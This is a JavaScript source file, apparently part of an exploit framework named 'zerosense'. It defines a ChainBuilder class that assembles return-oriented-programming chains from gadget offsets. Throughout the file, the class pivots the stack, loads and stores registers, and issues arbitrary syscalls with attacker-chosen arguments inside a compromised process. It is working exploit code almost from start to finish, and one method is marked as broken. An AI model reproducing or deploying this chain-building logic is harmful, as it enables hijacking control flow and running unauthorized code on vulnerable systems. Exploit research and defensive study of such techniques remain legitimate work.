/*eslint-disable no-param-reassign */
var Util = require('zerosense/Util');

/**
 * TODO: Move execution and jump/setup handing into here.
 * TODO: Come up with a better way to pass in data references as static registers, maybe this: https://codeutopia.net/blog/2016/11/24/best-practices-for-javascript-function-parameters/
 */
class ChainBuilder {
	
	constructor(offsets, gtemp = 0x8d000000) {
		this.offsets = offsets;
	
		this.dataAddress = 0;
	
		this.dataOffsets = {};
		this.chainDataOffsets = [];
		
		this.data = "";
		this.chain = "";
		
		this.gtemp = gtemp;
		this.stackPad = 0;
		
		this.chainStart();
	}
	
	create() {
		this.chainEnd();
		
		return this;
	}
	
	appendData(d) {
		this.data += d;
	}
	
	appendChain(c) {
		this.chain += c;
	}
	
	getDataCurrentOffset() {
		return this.data.length * 2;
	}
	
	appendDataOffsetToChain(doff) {
		var DO = unescape("\u444f");
		
		this.chainDataOffsets.push({ chainOffset: this.chain.length, dataOffset: doff });
		
		this.appendChain(Util.pad(0x4, DO));
	}
	
	getData() {
		return this.data;
	}
	
	getChain() {
		return unescape("\u4141\u2a2f")
			+ this.chain
			+ unescape("\u2f2a");
	}
	
	updateDataAddress(daddr) {
		this.dataAddress = daddr;
		
		for (var i = 0; i < this.chainDataOffsets.length; i++) {
			var cdo = this.chainDataOffsets[i];
			
			this.chain = this.chain.substr(0, cdo.chainOffset)
				+ Util.int32(this.dataAddress + cdo.dataOffset)
				+ this.chain.substr(cdo.chainOffset + 0x4 / 2);
		}
	}
	
	getDataOffset(id) {
		return this.dataOffsets[id];
	}
	
	chainStart() {
		var AA = unescape("\u4141"), SF = unescape("\u5346"), SX = unescape("\u5358");
		
		// Helper stack frame for exiting the chain.
		// First long is the stack pointer, gadget mod8 loads from this frame.
		// This is the second time it's called, since we have to dereference the pointer on the chain stack.
		this.dataOffsets['sfExit'] = this.getDataCurrentOffset();
		this.appendData(
			Util.int32(0x0)
			+ Util.pad(0x4, SX)
			+ Util.pad(0x8, AA)
			+ Util.int64(0x0, this.offsets.gadgetMod8)
		);
		
		// OPD for calling a gadget with no stack frame
		this.dataOffsets['opdGadgetZ1'] = this.getDataCurrentOffset();
		this.appendData(
			Util.int32(this.offsets.gadgetZ1)
			+ Util.int32(this.offsets.addrToc)
		);
		
		//////////
		
		this.appendChain(
			// Set up our new stack
			Util.int32(this.offsets.gadget1)
			+ Util.int32(this.offsets.addrToc)
			+ Util.pad(0x20, AA)
			+ Util.int64(0x0, this.offsets.addrToc)
			+ Util.pad(0x60, AA)
			
			//////////
			
			// Load r9 from stack, which is the opd to branch to
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetZMod1)
			+ Util.pad(0x68, AA)
			+ Util.int32(0x0)
		);
		
		this.appendDataOffsetToChain(this.dataOffsets['opdGadgetZ1']);
		
		this.appendChain(
			Util.int64(0x0, 0xffffffff)
			+ Util.pad(0x20, AA)
			
			//////////
			
			// Branch to our opd, which adds to r3 to get our exit stack pointer
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetZMod2)
			+ Util.pad(0x58, AA)
			
			//////////
			
			// Set up destination for our exit stack pointer, the data buffer
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13 + 4)
			+ Util.pad(0x60, AA)
			+ Util.int32(0x0)
		);
		
		this.appendDataOffsetToChain(this.dataOffsets['sfExit'] + 0x4 - 0x10);
			
		this.appendChain(
			//////////
			
			// Save the exit stack pointer
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13)
			+ Util.pad(0x68, AA)
		);
	}
	
	chainEnd() {
		var AA = unescape("\u4141");
		
		this.appendChain(
			// Load helper exit stack frame pointer from stack, and dereference once.
			// Continue from the helper frame, which finishes up.
			Util.int32(0x0)
		);
		
		this.appendDataOffsetToChain(this.dataOffsets['sfExit']);
		
		this.appendChain(
			Util.pad(0x8, AA)
			+ Util.int64(0x0, this.offsets.gadgetMod8)
		);
	}
	
	addData(id, str) {
		this.dataOffsets[id] = this.getDataCurrentOffset();
		this.appendData(str);
		
		return this;
	}
	
	syscallR3Data(sc, r3Data, r4, r5, r6, r7, r8, r9, r10, r31out) {
		var AA = unescape("\u4141"), SF = unescape("\u5346");
		
		r31out = r31out || this.gtemp;
		
		this.appendChain(
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.gtemp)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod1)
			+ Util.pad(0x5C, AA)
			+ Util.int32(sc)
			+ Util.int32(r10)
			+ Util.int32(r8)
			+ Util.int32(r7)
			+ Util.int32(r6)
			+ Util.int32(r5)
			+ Util.int32(r4)
			+ Util.pad(0x4, AA)
			+ Util.int32(r9)
			+ Util.pad(0x20, AA)
			+ Util.int32(0x0)
		);

		this.appendDataOffsetToChain(this.dataOffsets[r3Data]);

		this.appendChain(
			//////////
			
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.gtemp)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod4a)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, r31out)
		);
		
		return this;
	}
	
	syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10, r31out) {
		var AA = unescape("\u4141"), SF = unescape("\u5346");
		
		r31out = r31out || this.gtemp;
		
		this.appendChain(
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.gtemp)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod1)
			+ Util.pad(0x5C, AA)
			+ Util.int32(sc)
			+ Util.int32(r10)
			+ Util.int32(r8)
			+ Util.int32(r7)
			+ Util.int32(r6)
			+ Util.int32(r5)
			+ Util.int32(r4)
			+ Util.pad(0x4, AA)
			+ Util.int32(r9)
			+ Util.pad(0x20, AA)
			+ Util.int64(0x0, r3)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.gtemp)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod4a)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, r31out)
		);
		
		return this;
	}
	
	loadR3(src, r26out, r27out, r28out, r29out, r30out, r31out) {
		var AA = unescape("\u4141"), SF = unescape("\u5346");
		
		r26out = r26out || this.gtemp;
		r27out = r27out || this.gtemp;
		r28out = r28out || this.gtemp;
		r29out = r29out || this.gtemp;
		r30out = r30out || this.gtemp;
		r31out = r31out || this.gtemp;
		
		var c = Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod3)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.gtemp)
			+ Util.int64(0x0, src - 0x8)
			+ Util.int64(0x0, this.gtemp)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod15)
			+ Util.pad(0x58, AA)
			+ Util.int64(0x0, r26out)
			+ Util.int64(0x0, r27out)
			+ Util.int64(0x0, r28out)
			+ Util.int64(0x0, r29out)
			+ Util.int64(0x0, r30out)
			+ Util.int64(0x0, r31out);
			
		this.appendChain(c);
		
		return this;
	}
	
	storeR3(dst) {
		var AA = unescape("\u4141"), SF = unescape("\u5346");
		
		var c = Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13 + 4)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, dst - 0x10)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13)
			+ Util.pad(0x68, AA);
			
		this.appendChain(c);
		
		return this;
	}
	
	storeR3Data(id) {
		var AA = unescape("\u4141"), SF = unescape("\u5346");
		
		this.dataOffsets[id] = this.getDataCurrentOffset();
		this.appendData(
			Util.pad(0x4, AA)
		);
		
		this.appendChain(
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13 + 4)
			+ Util.pad(0x60, AA)
			+ Util.int32(0x0)
		);
		
		this.appendDataOffsetToChain(this.dataOffsets[id] - 0x10);
		
		this.appendChain(
			//////////
			
			Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod13)
			+ Util.pad(0x68, AA)
		);
		
		return this;
	}
	
	/**
	 * Broken
	 */
	callsub(sub, r3, r4, r5, r6, r7, r8, r9, r10, r11, frameSize, r31in, r31out) {
		var AA = unescape("\u4141"), SF = unescape("\u5346");
		
		var minFrameSize = 0x20;
		if (frameSize < minFrameSize) {
			throw new Error(`callsub: Frame size for 0x${sub.toString(16)} is too small`);
		}
		
		r31in = r31in || this.gtemp;
		r31out = r31out || this.gtemp;
		
		var c = Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, this.gtemp)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetLwR4to11LdR29to31)
			+ Util.pad(0x50, AA)
			+ Util.pad(0xC, AA)
			+ Util.int32(r11)
			+ Util.int32(r10)
			+ Util.int32(r8)
			+ Util.int32(r7)
			+ Util.int32(r6)
			+ Util.int32(r5)
			+ Util.int32(r4)
			+ Util.pad(0x4, AA)
			+ Util.int32(r9)
			+ Util.pad(0x20, AA)
			+ Util.int64(0x0, r3)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, this.offsets.gadgetMod2)
			+ Util.pad(0x60, AA)
			+ Util.int64(0x0, r31in)
			
			//////////
			
			+ Util.pad(0x10, SF)
			+ Util.int64(0x0, sub)
			+ Util.pad(frameSize - minFrameSize)
			+ Util.int64(0x0, r31out);
		
		this.appendChain(c);
		
		return this;
	}
	
	static setup2(addr) {
		return Util.pad(0x30)
			+ Util.int32(addr);
	}
	
	static setup1(addr) {		
		return Util.int32(addr);
	}
	
}

module.exports = ChainBuilder;